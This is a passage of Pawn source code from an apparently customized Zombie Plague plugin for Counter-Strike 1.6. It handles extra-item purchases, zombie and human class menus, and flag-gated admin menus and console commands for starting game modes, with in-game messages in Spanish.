	if ((itemid == EXTRA_ANTIDOTE && (g_antidotecounter[id] <= 0))
	|| (itemid == EXTRA_MADNESS && (gFuriaMax[id] <= 0))
	|| (itemid == EXTRA_INFBOMB && (g_infbombcounter <= 0 || gBombaMax[id] >= 1 || gLevel[id] < 10))
	|| (itemid == EXTRA_UNLIMITED_CLIP && ITEM_EXTRA_BalasInfinitas[id])
	|| (itemid == EXTRA_PRECISION_CLIP && ITEM_EXTRA_BalasPrecision[id])
	|| (itemid == EXTRA_ARMOR && (get_user_armor(id) >= 101)))
	{
		CC(id, "!g[ZP]!y Comando no disponible")
		return;
	}
	
	// Check for hard coded items with special conditions
	if ((itemid == EXTRA_ANTIDOTE && (g_endround || g_swarmround || g_nemround || g_survround || g_plagueround || gArmageddonRound || gSynapsisRound || gL4DRound ||
	gWeskerRound || gJasonRound || gSniperRound || gTaringaRound || fnGetZombies() <= 1 || fnGetHumans() == 1))
	|| (itemid == EXTRA_MADNESS && g_nodamage[id]) || (itemid == EXTRA_INFBOMB && (g_endround || g_swarmround || g_nemround || g_survround || g_plagueround ||
	gArmageddonRound || gSynapsisRound || gL4DRound || gWeskerRound || gJasonRound || gSniperRound || gTaringaRound)))
	{
		CC(id, "!g[ZP]!y No podes usar esto ahora")
		return;
	}
	
	// Ignore item's cost?
	if (!ignorecost)
	{
		// Check that we have enough ammo packs
		if (g_ammopacks[id] < (ArrayGetCell(g_extraitem_cost, itemid) * ((gReset[id]*500)+gLevel[id])))
		{
			CC(id, "!g[ZP]!y No tenes suficientes ammo packs")
			return;
		}
		
		// Deduce item cost
		UpdateAps(id, -(ArrayGetCell(g_extraitem_cost, itemid) * ((gReset[id]*500)+gLevel[id])), 0, 1)
	}
	
	// Check which kind of item we're buying
	switch (itemid)
	{
		case EXTRA_NVISION: // Night Vision
		{
			g_nvision[id] = true
			g_nvisionenabled[id] = true
			
			// Custom nvg?
			remove_task(id+TASK_NVISION)
			set_task(0.1, "set_user_nvision", id+TASK_NVISION, _, _, "b")
		}
		case EXTRA_ANTIDOTE: // Antidote
		{
			// Increase antidote purchase count for this round
			g_antidotecounter[id]--
			
			humanme(id, 0, 0, 0, 0, 0, 0)
		}
		case EXTRA_MADNESS: // Zombie Madness
		{
			// Increase madness purchase count for this round
			gFuriaMax[id]--
			g_nodamage[id] = true
			
			// Give LongJump
			give_item(id, "item_longjump")
			fm_set_user_longjump(id, true, true)
			
			set_task(0.1, "zombie_aura", id+TASK_AURA, _, _, "b")
			set_task(7.0, "madness_over", id+TASK_BLOOD)
			
			//static sound[64]
			//ArrayGetString(zombie_madness, random_num(0, ArraySize(zombie_madness) - 1), sound, charsmax(sound))
			emit_sound(id, CHAN_VOICE, gSOUND_ZOMBIE_MADNESS, 1.0, ATTN_NORM, 0, PITCH_HIGH)
		}
		case EXTRA_INFBOMB: // Infection Bomb
		{
			// Increase infection bomb purchase count for this round
			g_infbombcounter--
			gBombaMax[id]++
			
			// Already own one
			if (user_has_weapon(id, CSW_HEGRENADE))
			{
				// Increase BP ammo on it instead
				cs_set_user_bpammo(id, CSW_HEGRENADE, cs_get_user_bpammo(id, CSW_HEGRENADE) + 1)
				
				// Flash ammo in hud
				message_begin(MSG_ONE_UNRELIABLE, g_msgAmmoPickup, _, id)
				write_byte(AMMOID[CSW_HEGRENADE]) // ammo id
				write_byte(1) // ammo amount
				message_end()
				
				// Play clip purchase sound
				emit_sound(id, CHAN_ITEM, sound_buyammo, 1.0, ATTN_NORM, 0, PITCH_NORM)
				
				return; // stop here
			}
			
			// Give weapon to the player
			give_item(id, "weapon_hegrenade")
		}
		case EXTRA_UNLIMITED_CLIP: ITEM_EXTRA_BalasInfinitas[id] = 1
		case EXTRA_PRECISION_CLIP: ITEM_EXTRA_BalasPrecision[id] = 1
		case EXTRA_ARMOR: set_user_armor(id, get_user_armor(id) + 100)
		default:
		{
			if (itemid >= EXTRA_WEAPONS_STARTID && itemid <= EXTRAS_CUSTOM_STARTID-1) // Weapons
			{
				// Get weapon's id and name
				static weaponid, wname[32]
				ArrayGetString(g_extraweapon_items, itemid - EXTRA_WEAPONS_STARTID, wname, charsmax(wname))
				weaponid = cs_weapon_name_to_id(wname)
				
				// If we are giving a primary/secondary weapon
				if (MAXBPAMMO[weaponid] > 2)
				{
					// Make user drop the previous one
					if ((1<<weaponid) & PRIMARY_WEAPONS_BIT_SUM)
						drop_weapons(id, 1)
					else
						drop_weapons(id, 2)
					
					// Give full BP ammo for the new one
					ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[weaponid], AMMOTYPE[weaponid], MAXBPAMMO[weaponid])
				}
				// If we are giving a grenade which the user already owns
				else if (user_has_weapon(id, weaponid))
				{
					// Increase BP ammo on it instead
					cs_set_user_bpammo(id, weaponid, cs_get_user_bpammo(id, weaponid) + 1)
					
					// Flash ammo in hud
					message_begin(MSG_ONE_UNRELIABLE, g_msgAmmoPickup, _, id)
					write_byte(AMMOID[weaponid]) // ammo id
					write_byte(1) // ammo amount
					message_end()
					
					// Play clip purchase sound
					emit_sound(id, CHAN_ITEM, sound_buyammo, 1.0, ATTN_NORM, 0, PITCH_NORM)
					
					return; // stop here
				}
				
				// Give weapon to the player
				give_item(id, wname)
			}
			else // Custom additions
			{
				// Item selected forward
				//ExecuteForward(g_fwExtraItemSelected, g_fwDummyResult, id, itemid);
				
				// Item purchase blocked, restore buyer's ammo packs
				if (g_fwDummyResult >= ZP_PLUGIN_HANDLED && !ignorecost)
					UpdateAps(id, (ArrayGetCell(g_extraitem_cost, itemid) * ((gReset[id]*500)+gLevel[id])), 0, 1)
			}
		}
	}
}

// Zombie Class Menu
public menu_zclass(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_hzclass(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve zombie class id
	static buffer[2], dummy, classid
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	classid = buffer[0]
	
	// Store selection for the next infection
	g_zombieclassnext[id] = classid
	
	static szname[32]
	ArrayGetString(g_zclass_name, g_zombieclassnext[id], szname, charsmax(szname))
	
	// Show selected zombie class info and stats
	CC(id, "!g[ZP]!y En tu próxima infección tu clase zombie será: !g%s!y", szname)
	CC(id, "!g[ZP]!y !gVida:!y %d - !gVelocidad:!y %d - !gGravedad:!y %d - !gDaño:!y +%d%%", ArrayGetCell(g_zclass_hp, g_zombieclassnext[id]),
	ArrayGetCell(g_zclass_spd, g_zombieclassnext[id]), floatround(Float:ArrayGetCell(g_zclass_grav, g_zombieclassnext[id]) * 800.0),
	floatround(Float:ArrayGetCell(g_zclass_dmg, g_zombieclassnext[id])))
	
	menu_destroy(menuid)
	show_menu_zclass(id)
	return PLUGIN_HANDLED;
}

// Human Class Menu
public menu_hclass(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_hzclass(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve human class id
	static buffer[2], dummy, classid
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	classid = buffer[0]
	
	// Store selection for the next respawn
	g_humanclassnext[id] = classid
	
	static szname[32]
	ArrayGetString(g_hclass_name, g_humanclassnext[id], szname, charsmax(szname))
	
	// Show selected human class info and stats
	CC(id, "!g[ZP]!y En tu próximo respawn tu clase humana será: !g%s!y", szname)
	CC(id, "!g[ZP]!y !gVida:!y %d - !gVelocidad:!y %d - !gGravedad:!y %d - !gChaleco:!y %d - !gDaño:!y +%d%%", ArrayGetCell(g_hclass_hp, g_humanclassnext[id]),
	ArrayGetCell(g_hclass_spd, g_humanclassnext[id]), floatround(Float:ArrayGetCell(g_hclass_grav, g_humanclassnext[id]) * 800.0),
	ArrayGetCell(g_hclass_armor, g_humanclassnext[id]), floatround(Float:ArrayGetCell(g_hclass_dmg, g_humanclassnext[id])))
	
	menu_destroy(menuid)
	show_menu_hclass(id)
	return PLUGIN_HANDLED;
}

// Admin Menu
public menu_admin(id, key)
{
	static userflags
	userflags = get_user_flags(id)
	
	switch (key)
	{
		case ACTION_ZOMBIEFY_HUMANIZE: // Zombiefy/Humanize command
		{
			if (userflags & (ACCESS_MODE))
			{
				// Show player list for admin to pick a target
				PL_ACTION = ACTION_ZOMBIEFY_HUMANIZE
				show_menu_player_list(id)
			}
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin(id)
			}
		}
		case ACTION_MAKE_NEMESIS: // Nemesis command
		{
			if (userflags & (ACCESS_MODE))
			{
				fnShowModeMenu(id, MODE_NEMESIS)
				
				// Show player list for admin to pick a target
				/*PL_ACTION = ACTION_MAKE_NEMESIS
				show_menu_player_list(id)*/
			}
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin(id)
			}
		}
		case ACTION_MAKE_SURVIVOR: // Survivor command
		{
			if (userflags & (ACCESS_MODE))
			{
				fnShowModeMenu(id, MODE_SURVIVOR)
				// Show player list for admin to pick a target
				/*PL_ACTION = ACTION_MAKE_SURVIVOR
				show_menu_player_list(id)*/
			}
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin(id)
			}
		}
		case ACTION_RESPAWN_PLAYER: // Respawn command
		{
			if (userflags & ACCESS_MODE)
			{
				// Show player list for admin to pick a target
				PL_ACTION = ACTION_RESPAWN_PLAYER
				show_menu_player_list(id)
			}
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin(id)
			}
		}
		case ACTION_MODE_SWARM: // Swarm Mode command
		{
			if (userflags & ACCESS_MODE)
			{
				if (allowed_swarm())
					command_swarm(id)
				else
					CC(id, "!g[ZP]!y Comando no disponibles")
			}
			else
				CC(id, "!g[ZP]!y No tenes acceso")
			
			show_menu_admin(id)
		}
		case ACTION_MODE_MULTI: // Multiple Infection command
		{
			if (userflags & ACCESS_MODE)
			{
				if (allowed_multi())
					command_multi(id)
				else
					CC(id, "!g[ZP]!y Comando no disponible")
			}
			else
				CC(id, "!g[ZP]!y No tenes acceso")
			
			show_menu_admin(id)
		}
		case ACTION_MODE_PLAGUE: // Plague Mode command
		{
			if (userflags & ACCESS_MODE)
			{
				if (allowed_plague())
					command_plague(id)
				else
					CC(id, "!g[ZP]!y Comando no disponible")
			}
			else
				CC(id, "!g[ZP]!y No tenes acceso")
			
			show_menu_admin(id)
		}
		case 7: // Armageddon Mode command
		{
			if (userflags & ACCESS_MODE_2)
			{
				if(allowed_swarm())
					command_armageddon(id)
				else
					CC(id, "!g[ZP]!y Comando no disponible")
			}
			else
				CC(id, "!g[ZP]!y No tenes acceso")
			show_menu_admin(id)
		}
		case 8:	show_menu_admin2(id)
		case 9: show_menu_game(id)
	}
	
	return PLUGIN_HANDLED;
}

// Admin Menu - Page 2
public menu_admin2(id, key)
{
	static userflags
	userflags = get_user_flags(id)
	
	switch (key)
	{
		case 0: // Synapsis command
		{
			if (userflags & ACCESS_MODE_2)
			{
				if(allowed_swarm() && fnGetAlive() >= 12)
					command_synapsis(id)
				else
					CC(id, "!g[ZP]!y Comando no disponible")
			}
			else
				CC(id, "!g[ZP]!y No tenes acceso")
				
			show_menu_admin2(id)
		}
		case 1: // L4D command
		{
			if (userflags & ACCESS_MODE_2)
			{
				if(allowed_swarm() && fnGetAlive() >= 20)
					command_l4d(id)
				else
					CC(id, "!g[ZP]!y Comando no disponible")
			}
			else
				CC(id, "!g[ZP]!y No tenes acceso")
			
			show_menu_admin2(id)
		}
		case 2: // Wesker command
		{
			if(userflags & ACCESS_MODE)
			{
				fnShowModeMenu(id, MODE_WESKER)
				// Show player list for admin to pick a target
				/*PL_ACTION = ACTION_MODE_WESKER
				show_menu_player_list(id)*/
			}
			/*else if(userflags & ACCESS_MODE)
			{
				if(allowed_swarm())
				{
					client_print(0, print_chat, "ADMIN - %s comenzar modo Wesker", g_playername[id])
					
					id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
				
					remove_task(TASK_MAKEZOMBIE)
					make_a_zombie(MODE_WESKER, id)
				}
				else
				{
					CC(id, "!g[ZP]!y Comando no disponible")
					show_menu_admin2(id)
				}
			}*/
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin2(id)
			}
		}
		case 3: // Ninja command
		{
			if(userflags & ACCESS_MODE)
			{
				fnShowModeMenu(id, MODE_NINJA)
				// Show player list for admin to pick a target
				/*PL_ACTION = ACTION_MODE_NINJA
				show_menu_player_list(id)*/
			}
			/*else if(userflags & ACCESS_MODE)
			{
				if(allowed_swarm())
				{
					client_print(0, print_chat, "ADMIN - %s comenzar modo Jason", g_playername[id])
					
					id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
				
					remove_task(TASK_MAKEZOMBIE)
					make_a_zombie(MODE_NINJA, id)
				}
				else
				{
					CC(id, "!g[ZP]!y Comando no disponible")
					show_menu_admin2(id)
				}
			}*/
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin2(id)
			}
		}
		case 4: // Sniper command
		{
			/*if(userflags & ACCESS_MODE_2)
			{
				// Show player list for admin to pick a target
				PL_ACTION = ACTION_MODE_SNIPER
				show_menu_player_list(id)
			}
			else */if(userflags & ACCESS_MODE)
			{
				if(allowed_swarm() && fnGetAlive() >= 5)
					command_sniper__(id)
				/*{
					client_print(0, print_chat, "ADMIN - %s comenzar modo Sniper", g_playername[id])
					
					id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
				
					remove_task(TASK_MAKEZOMBIE)
					make_a_zombie(MODE_SNIPER, id)
				}*/
				else
				{
					CC(id, "!g[ZP]!y Comando no disponible")
					show_menu_admin2(id)
				}
			}
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin2(id)
			}
		}
		case 5: // Taringa command
		{
			if (userflags & ACCESS_MODE_2)
			{
				if(allowed_swarm() && fnGetAlive() >= 12)
					command_taringa(id)
				else
					CC(id, "!g[ZP]!y Comando no disponible")
			}
			else
				CC(id, "!g[ZP]!y No tenes acceso")
				
			show_menu_admin2(id)
		}
		case 6: // Troll command
		{
			if(userflags & ACCESS_MODE_2)
			{
				fnShowModeMenu(id, MODE_TROLL)
				// Show player list for admin to pick a target
				/*PL_ACTION = ACTION_MAKE_TROLL
				show_menu_player_list(id)*/
			}
			/*else if(userflags & ACCESS_MODE)
			{
				if(allowed_swarm() && fnGetAlive() >= 20)
				{
					client_print(0, print_chat, "ADMIN - %s comenzar modo Troll", g_playername[id])
					
					id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
				
					remove_task(TASK_MAKEZOMBIE)
					make_a_zombie(MODE_TROLL, id)
				}
				else
				{
					CC(id, "!g[ZP]!y Comando no disponible")
					show_menu_admin2(id)
				}
			}*/
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				show_menu_admin2(id)
			}
		}
		case 8: show_menu_admin(id)
		case 9: show_menu_game(id)
	}
	
	return PLUGIN_HANDLED;
}

new mode_recorded[33];
public fnShowModeMenu(id, mode_type)
{
	new menu[2][256], menuid
	
	switch(mode_type)
	{
		case MODE_NEMESIS: 
		{
			formatex(menu[0], 255, "Hacer nemesis")
			formatex(menu[1], 255, "Comenzar nodo nemesis")
		}
		case MODE_SURVIVOR: 
		{
			formatex(menu[0], 255, "Hacer survivor")
			formatex(menu[1], 255, "Comenzar modo survivor")
		}
		case MODE_WESKER: 
		{
			formatex(menu[0], 255, "Hacer wesker")
			formatex(menu[1], 255, "Comenzar modo wesker")
		}
		case MODE_NINJA: 
		{
			formatex(menu[0], 255, "Hacer jason")
			formatex(menu[1], 255, "Comenzar modo jason")
		}
		case MODE_TROLL: 
		{
			formatex(menu[0], 255, "Hacer troll")
			formatex(menu[1], 255, "Comenzar modo troll")
		}
	}
	
	mode_recorded[id] = mode_type
	
	menuid = menu_create("\yQue deseas ?", "mode_menu")
	
	menu_additem(menuid, menu[0], "1")
	menu_additem(menuid, menu[1], "2")
	
	// Back
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}

public mode_menu(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_admin(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[2], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch( str_to_num(buffer) )
	{
		case 1:
		{
			if( get_user_flags(id) & ACCESS_MODE_2 )
			{
				switch(mode_recorded[id])
				{
					case MODE_NEMESIS: 
					{
						PL_ACTION = ACTION_MAKE_NEMESIS
						show_menu_player_list(id)
					}
					case MODE_SURVIVOR: 
					{
						PL_ACTION = ACTION_MAKE_SURVIVOR
						show_menu_player_list(id)
					}
					case MODE_WESKER: 
					{
						PL_ACTION = ACTION_MODE_WESKER
						show_menu_player_list(id)
					}
					case MODE_NINJA: 
					{
						PL_ACTION = ACTION_MODE_NINJA
						show_menu_player_list(id)
					}
					case MODE_TROLL: 
					{
						PL_ACTION = ACTION_MAKE_TROLL
						show_menu_player_list(id)
					}
				}
			}
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				fnShowModeMenu(id, mode_recorded[id])
			}
		}
		case 2:
		{
			if( get_user_flags(id) & ACCESS_MODE )
			{
				switch(mode_recorded[id])
				{
					case MODE_NEMESIS: 
					{
						if(allowed_swarm())
						{
							client_print(0, print_chat, "ADMIN - %s comenzar modo nemesis", g_playername[id])
							
							id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
						
							remove_task(TASK_MAKEZOMBIE)
							make_a_zombie(MODE_NEMESIS, id)
						}
						else
						{
							CC(id, "!g[ZP]!y Comando no disponible")
							show_menu_admin(id)
						}
					}
					case MODE_SURVIVOR: 
					{
						if(allowed_swarm())
						{
							client_print(0, print_chat, "ADMIN - %s comenzar modo survivor", g_playername[id])
							
							id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
						
							remove_task(TASK_MAKEZOMBIE)
							make_a_zombie(MODE_SURVIVOR, id)
						}
						else
						{
							CC(id, "!g[ZP]!y Comando no disponible")
							show_menu_admin(id)
						}
					}
					case MODE_WESKER: 
					{
						if(allowed_swarm())
						{
							client_print(0, print_chat, "ADMIN - %s comenzar modo wesker", g_playername[id])
							
							id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
						
							remove_task(TASK_MAKEZOMBIE)
							make_a_zombie(MODE_WESKER, id)
						}
						else
						{
							CC(id, "!g[ZP]!y Comando no disponible")
							show_menu_admin2(id)
						}
					}
					case MODE_NINJA: 
					{
						if(allowed_swarm())
						{
							client_print(0, print_chat, "ADMIN - %s comenzar modo jason", g_playername[id])
							
							id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
						
							remove_task(TASK_MAKEZOMBIE)
							make_a_zombie(MODE_NINJA, id)
						}
						else
						{
							CC(id, "!g[ZP]!y Comando no disponible")
							show_menu_admin2(id)
						}
					}
					case MODE_TROLL: 
					{
						if(allowed_swarm())
						{
							client_print(0, print_chat, "ADMIN - %s comenzar modo troll", g_playername[id])
							
							id = fnGetRandomAlive( random_num( 1, fnGetAlive( ) ) )
						
							remove_task(TASK_MAKEZOMBIE)
							make_a_zombie(MODE_TROLL, id)
						}
						else
						{
							CC(id, "!g[ZP]!y Comando no disponible")
							show_menu_admin2(id)
						}
					}
				}
			}
			else
			{
				CC(id, "!g[ZP]!y No tenes acceso")
				fnShowModeMenu(id, mode_recorded[id])
			}
		}
	}
	
	menu_destroy(menuid)
	return PLUGIN_HANDLED;
}

// Player List Menu
public menu_player_list(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		if( PL_ACTION == ACTION_MODE_WESKER || PL_ACTION == ACTION_MODE_NINJA || PL_ACTION == ACTION_MAKE_TROLL /*|| PL_ACTION == ACTION_MODE_SNIPER*/ ) show_menu_admin2(id)
		else show_menu_admin(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve player id
	static buffer[2], dummy, playerid
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	playerid = buffer[0]
	
	// Perform action on player
	
	// Get admin flags
	static userflags
	userflags = get_user_flags(id)
	
	// Make sure it's still connected
	if (g_isconnected[playerid])
	{
		// Perform the right action if allowed
		switch (PL_ACTION)
		{
			case ACTION_ZOMBIEFY_HUMANIZE: // Zombiefy/Humanize command
			{
				if (g_zombie[playerid])
				{
					if (userflags & ACCESS_MODE)
					{
						if (allowed_human(playerid))
							command_human(id, playerid)
						else
							CC(id, "!g[ZP]!y Comando no disponible")
					}
					else
						CC(id, "!g[ZP]!y No tenes acceso")
				}
				else
				{
					if (userflags & ACCESS_MODE)
					{
						if (allowed_zombie(playerid))
							command_zombie(id, playerid)
						else
							CC(id, "!g[ZP]!y Comando no disponible")
					}
					else
						CC(id, "!g[ZP]!y No tenes acceso")
				}
			}
			case ACTION_MAKE_NEMESIS: // Nemesis command
			{
				if (userflags & ACCESS_MODE)
				{
					if (allowed_nemesis(playerid))
						command_nemesis(id, playerid)
					else
						CC(id, "!g[ZP]!y Comando no disponible")
				}
				else
					CC(id, "!g[ZP]!y No tenes acceso")
			}
			case ACTION_MAKE_SURVIVOR: // Survivor command
			{
				if (userflags & ACCESS_MODE)
				{
					if (allowed_survivor(playerid))
						command_survivor(id, playerid)
					else
						CC(id, "!g[ZP]!y Comando no disponible")
				}
				else
					CC(id, "!g[ZP]!y No tenes acceso")
			}
			case ACTION_RESPAWN_PLAYER: // Respawn command
			{
				if (userflags & ACCESS_MODE)
				{
					if (allowed_respawn(playerid))
						command_respawn(id, playerid)
					else
						CC(id, "!g[ZP]!y Comando no disponible")
				}
				else
					CC(id, "!g[ZP]!y No tenes acceso")
			}
			case ACTION_MODE_WESKER: // Wesker command
			{
				if (userflags & ACCESS_MODE_2)
				{
					if (allowed_wesker(playerid))
						command_wesker(id, playerid)
					else
						CC(id, "!g[ZP]!y Comando no disponible")
				}
				else
					CC(id, "!g[ZP]!y No tenes acceso")
			}
			case ACTION_MODE_NINJA: // Ninja command
			{
				if (userflags & ACCESS_MODE_2)
				{
					if (allowed_ninja(playerid))
						command_ninja(id, playerid)
					else
						CC(id, "!g[ZP]!y Comando no disponible")
				}
				else
					CC(id, "!g[ZP]!y No tenes acceso")
			}
			case ACTION_MAKE_TROLL: // Troll command
			{
				if (userflags & ACCESS_MODE)
				{
					if (allowed_troll(playerid))
						command_troll(id, playerid)
					else
						CC(id, "!g[ZP]!y Comando no disponible")
				}
				else
					CC(id, "!g[ZP]!y No tenes acceso")
			}
			/*case ACTION_MODE_SNIPER: // Sniper command
			{
				if (userflags & ACCESS_MODE_2)
				{
					if (allowed_sniper(playerid))
						command_sniper(id, playerid)
					else
						CC(id, "!g[ZP]!y Comando no disponible")
				}
				else
					CC(id, "!g[ZP]!y No tienes acceso")
			}*/
		}
	}
	else
		CC(id, "!g[ZP]!y Comando no disponible")
	
	menu_destroy(menuid)
	show_menu_player_list(id)
	
	return PLUGIN_HANDLED;
}

/*================================================================================
 [Admin Commands]
=================================================================================*/

// zp_zombie [target]
public cmd_zombie(id, level, cid)
{
	// Start Mode Infection
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be zombie
	if (!allowed_zombie(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED
	}
	
	command_zombie(id, player)
	
	return PLUGIN_HANDLED;
}

// zp_human [target]
public cmd_human(id, level, cid)
{
	// Check for access flag - Make Human
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be human
	if (!allowed_human(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_human(id, player)
	
	return PLUGIN_HANDLED;
}

// zp_survivor [target]
public cmd_survivor(id, level, cid)
{
	// Start Mode Survivor
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be survivor
	if (!allowed_survivor(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_survivor(id, player)
	
	return PLUGIN_HANDLED;
}

// zp_nemesis [target]
public cmd_nemesis(id, level, cid)
{
	// Start Mode Nemesis
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be nemesis
	if (!allowed_nemesis(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_nemesis(id, player)
	
	return PLUGIN_HANDLED;
}

// zp_respawn [target]
public cmd_respawn(id, level, cid)
{
	// Check for access flag - Respawn
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, CMDTARGET_ALLOW_SELF)
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be respawned
	if (!allowed_respawn(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_respawn(id, player)
	
	return PLUGIN_HANDLED;
}

// zp_swarm
public cmd_swarm(id, level, cid)
{
	// Check for access flag - Mode Swarm
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Swarm mode not allowed
	if (!allowed_swarm())
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_swarm(id)
	
	return PLUGIN_HANDLED;
}

// zp_multi
public cmd_multi(id, level, cid)
{
	// Check for access flag - Mode Multi
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Multi infection mode not allowed
	if (!allowed_multi())
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_multi(id)
	
	return PLUGIN_HANDLED;
}

// zp_plague
public cmd_plague(id, level, cid)
{
	// Check for access flag - Mode Plague
	if (!cmd_access(id, ACCESS_MODE, cid, 2))
		return PLUGIN_HANDLED;
	
	// Plague mode not allowed
	if (!allowed_plague())
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_plague(id)
	
	return PLUGIN_HANDLED;
}

// zp_wesker [target]
public cmd_wesker(id, level, cid)
{
	// Start Mode Wesker
	if (!cmd_access(id, ACCESS_MODE_2, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be wesker
	if (!allowed_wesker(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_wesker(id, player)
	
	return PLUGIN_HANDLED;
}

// zp_ninja [target]
public cmd_ninja(id, level, cid)
{
	// Start Mode Ninja
	if (!cmd_access(id, ACCESS_MODE_2, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be ninja
	if (!allowed_ninja(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_ninja(id, player)
	
	return PLUGIN_HANDLED;
}

// zp_sniper [target]
/*public cmd_sniper(id, level, cid)
{
	// Start Mode Sniper
	if (!cmd_access(id, ACCESS_MODE_2, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
	player = cmd_target(id, arg, (CMDTARGET_ONLY_ALIVE | CMDTARGET_ALLOW_SELF))
	
	// Invalid target
	if (!player) return PLUGIN_HANDLED;
	
	// Target not allowed to be ninja
	if (!allowed_sniper(player))
	{
		client_print(id, print_console, "[ZP] Comando no disponible")
		return PLUGIN_HANDLED;
	}
	
	command_sniper(id, player)
	
	return PLUGIN_HANDLED;
}*/

// zp_troll [target]
public cmd_troll(id, level, cid)
{
	// Start Mode Troll
	if (!cmd_access(id, ACCESS_MODE_2, cid, 2))
		return PLUGIN_HANDLED;
	
	// Retrieve arguments
	static arg[32], player
	read_argv(1, arg, charsmax(arg))
